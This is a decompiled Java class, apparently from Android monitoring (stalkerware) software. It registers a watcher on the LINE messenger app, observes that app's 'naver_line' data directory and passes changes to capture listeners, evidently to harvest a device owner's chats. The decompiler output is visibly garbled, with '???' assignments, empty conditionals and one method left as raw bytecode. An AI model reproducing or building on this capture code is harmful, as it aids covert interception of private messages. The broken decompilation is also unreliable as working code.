package com.vvt.capture.c;

import com.vvt.ak.a;
import com.vvt.io.j;
import com.vvt.io.m;
import com.vvt.m.b;
import java.io.File;
import java.util.HashSet;
import java.util.Iterator;

public class h
  implements m
{
  private static final String a = h.class.getSimpleName();
  private static final boolean b = a.b;
  private static final boolean c = a.a;
  private static final boolean d = a.e;
  private static final String e;
  private static h f;
  private HashSet g;
  private k h;
  private j i;
  private boolean j;
  
  static
  {
    StringBuilder localStringBuilder = new java/lang/StringBuilder;
    localStringBuilder.<init>();
    String str = b.c;
    e = str + "/" + "LINE/";
  }
  
  private h()
  {
    HashSet localHashSet = new java/util/HashSet;
    localHashSet.<init>();
    this.g = localHashSet;
  }
  
  public static h a()
  {
    synchronized (h.class)
    {
      h localh = f;
      if (localh == null)
      {
        localh = new com/vvt/capture/c/h;
        localh.<init>();
        f = localh;
      }
      localh = f;
      return localh;
    }
  }
  
  public void a(com.vvt.base.capture.i parami)
  {
    boolean bool = c;
    if (bool) {}
    bool = true;
    this.j = bool;
    synchronized (this.g)
    {
      Object localObject2 = this.g;
      bool = ((HashSet)localObject2).contains(parami);
      if (!bool)
      {
        localObject2 = this.g;
        ((HashSet)localObject2).add(parami);
      }
      localObject2 = this.h;
      if (localObject2 == null)
      {
        localObject2 = this.i;
        if (localObject2 == null)
        {
          localObject2 = j.a();
          this.i = ((j)localObject2);
        }
        bool = c;
        if (bool) {}
        localObject2 = this.i;
        ??? = "jp.naver.line.android";
        ((j)localObject2).a((String)???, this);
        bool = c;
        if (!bool) {}
      }
      return;
    }
  }
  
  public void a(String paramString)
  {
    bool = c;
    if (bool) {}
    try
    {
      localk = this.h;
      if (localk != null)
      {
        bool = c;
        if (bool) {}
        localk = this.h;
        localk.stopWatching();
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        k localk;
        bool = d;
        if (!bool) {}
      }
    }
    localk = null;
    this.h = null;
    bool = c;
    if (bool) {}
  }
  
  public void a(String paramString1, String paramString2)
  {
    boolean bool = c;
    if (bool) {}
    bool = c;
    if (bool) {}
    Object localObject1 = this.g;
    Object localObject2 = ((HashSet)localObject1).iterator();
    for (;;)
    {
      bool = ((Iterator)localObject2).hasNext();
      if (!bool) {
        break;
      }
      localObject1 = (com.vvt.base.capture.i)((Iterator)localObject2).next();
      ((com.vvt.base.capture.i)localObject1).a(paramString1, paramString2);
    }
    localObject1 = new com/vvt/capture/c/i;
    localObject2 = "LineStikerUnzipThread";
    ((i)localObject1).<init>(this, (String)localObject2);
    ((Thread)localObject1).start();
    bool = c;
    if (bool) {}
  }
  
  /* Error */
  public void b(com.vvt.base.capture.i parami)
  {
    // Byte code:
    //   0: getstatic 39	com/vvt/capture/MyUncaughtExceptionHandler/AppEngine1:MyUncaughtExceptionHandler	Z
    //   3: istore_2
    //   4: iload_2
    //   5: ifeq +3 -> 8
    //   8: aload_0
    //   9: getfield 72	com/vvt/capture/MyUncaughtExceptionHandler/AppEngine1:FxFileObserverWorker	Ljava/util/HashSet;
    //   12: astore_3
    //   13: aload_3
    //   14: monitorenter
    //   15: aload_0
    //   16: getfield 72	com/vvt/capture/MyUncaughtExceptionHandler/AppEngine1:FxFileObserverWorker	Ljava/util/HashSet;
    //   19: astore 4
    //   21: aload 4
    //   23: aload_1
    //   24: invokevirtual 82	java/util/HashSet:contains	(Ljava/lang/Object;)Z
    //   27: istore_2
    //   28: iload_2
    //   29: ifeq +16 -> 45
    //   32: aload_0
    //   33: getfield 72	com/vvt/capture/MyUncaughtExceptionHandler/AppEngine1:FxFileObserverWorker	Ljava/util/HashSet;
    //   36: astore 4
    //   38: aload 4
    //   40: aload_1
    //   41: invokevirtual 140	java/util/HashSet:remove	(Ljava/lang/Object;)Z
    //   44: pop
    //   45: aload_3
    //   46: monitorexit
    //   47: aload_0
    //   48: getfield 72	com/vvt/capture/MyUncaughtExceptionHandler/AppEngine1:FxFileObserverWorker	Ljava/util/HashSet;
    //   51: astore 4
    //   53: aload 4
    //   55: invokevirtual 144	java/util/HashSet:size	()I
    //   58: istore_2
    //   59: getstatic 39	com/vvt/capture/MyUncaughtExceptionHandler/AppEngine1:MyUncaughtExceptionHandler	Z
    //   62: istore 5
    //   64: iload 5
    //   66: ifeq +3 -> 69
    //   69: iload_2
    //   70: ifne +79 -> 149
    //   73: iconst_0
    //   74: istore_2
    //   75: aconst_null
    //   76: astore 4
    //   78: aload_0
    //   79: iconst_0
    //   80: putfield 77	com/vvt/capture/MyUncaughtExceptionHandler/AppEngine1:j	Z
    //   83: aload_0
    //   84: getfield 87	com/vvt/capture/MyUncaughtExceptionHandler/AppEngine1:AppEngine1	Lcom/vvt/capture/MyUncaughtExceptionHandler/k;
    //   87: astore 4
    //   89: aload 4
    //   91: ifnull +22 -> 113
    //   94: getstatic 39	com/vvt/capture/MyUncaughtExceptionHandler/AppEngine1:MyUncaughtExceptionHandler	Z
    //   97: istore_2
    //   98: iload_2
    //   99: ifeq +3 -> 102
    //   102: aload_0
    //   103: getfield 87	com/vvt/capture/MyUncaughtExceptionHandler/AppEngine1:AppEngine1	Lcom/vvt/capture/MyUncaughtExceptionHandler/k;
    //   106: astore 4
    //   108: aload 4
    //   110: invokevirtual 104	com/vvt/capture/MyUncaughtExceptionHandler/k:stopWatching	()V
    //   113: aload_0
    //   114: getfield 89	com/vvt/capture/MyUncaughtExceptionHandler/AppEngine1:i	Lcom/vvt/io/j;
    //   117: astore 4
    //   119: aload 4
    //   121: ifnull +18 -> 139
    //   124: aload_0
    //   125: getfield 89	com/vvt/capture/MyUncaughtExceptionHandler/AppEngine1:i	Lcom/vvt/io/j;
    //   128: astore 4
    //   130: ldc 96
    //   132: astore_3
    //   133: aload 4
    //   135: aload_3
    //   136: invokevirtual 147	com/vvt/io/j:a	(Ljava/lang/String;)V
    //   139: iconst_0
    //   140: istore_2
    //   141: aconst_null
    //   142: astore 4
    //   144: aload_0
    //   145: aconst_null
    //   146: putfield 87	com/vvt/capture/MyUncaughtExceptionHandler/AppEngine1:AppEngine1	Lcom/vvt/capture/MyUncaughtExceptionHandler/k;
    //   149: getstatic 39	com/vvt/capture/MyUncaughtExceptionHandler/AppEngine1:MyUncaughtExceptionHandler	Z
    //   152: istore_2
    //   153: iload_2
    //   154: ifeq +3 -> 157
    //   157: return
    //   158: astore 4
    //   160: aload_3
    //   161: monitorexit
    //   162: aload 4
    //   164: athrow
    //   165: astore 4
    //   167: getstatic 43	com/vvt/capture/MyUncaughtExceptionHandler/AppEngine1:d	Z
    //   170: istore_2
    //   171: iload_2
    //   172: ifeq -23 -> 149
    //   175: goto -26 -> 149
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	178	0	this	AppEngine1
    //   0	178	1	parami	com.vvt.base.capture.i
    //   3	26	2	bool1	boolean
    //   58	17	2	k	int
    //   97	75	2	bool2	boolean
    //   19	124	4	localObject2	Object
    //   158	5	4	localObject3	Object
    //   165	1	4	localException	Exception
    //   62	3	5	bool3	boolean
    // Exception table:
    //   from	to	target	type
    //   15	19	158	finally
    //   23	27	158	finally
    //   32	36	158	finally
    //   40	45	158	finally
    //   45	47	158	finally
    //   160	162	158	finally
    //   8	12	165	java/lang/Exception
    //   13	15	165	java/lang/Exception
    //   47	51	165	java/lang/Exception
    //   53	58	165	java/lang/Exception
    //   59	62	165	java/lang/Exception
    //   79	83	165	java/lang/Exception
    //   83	87	165	java/lang/Exception
    //   94	97	165	java/lang/Exception
    //   102	106	165	java/lang/Exception
    //   108	113	165	java/lang/Exception
    //   113	117	165	java/lang/Exception
    //   124	128	165	java/lang/Exception
    //   135	139	165	java/lang/Exception
    //   145	149	165	java/lang/Exception
    //   162	165	165	java/lang/Exception
  }
  
  public void b(String paramString1, String paramString2)
  {
    boolean bool1 = c;
    if (bool1) {}
    Object localObject1 = new java/lang/StringBuilder;
    ((StringBuilder)localObject1).<init>();
    localObject1 = ((StringBuilder)localObject1).append(paramString2);
    Object localObject2 = File.separator;
    localObject1 = (String)localObject2 + "naver_line";
    localObject2 = new java/io/File;
    ((File)localObject2).<init>((String)localObject1);
    boolean bool2 = ((File)localObject2).exists();
    if (bool2)
    {
      localObject2 = this.h;
      if (localObject2 == null)
      {
        bool2 = b;
        if (bool2) {}
        localObject2 = new com/vvt/capture/c/k;
        ((k)localObject2).<init>(this, (String)localObject1);
        this.h = ((k)localObject2);
        localObject1 = this.h;
        ((k)localObject1).startWatching();
      }
    }
    bool1 = c;
    if (bool1) {}
  }
  
  public void c(String paramString1, String paramString2) {}
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/MyUncaughtExceptionHandler/AppEngine1.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */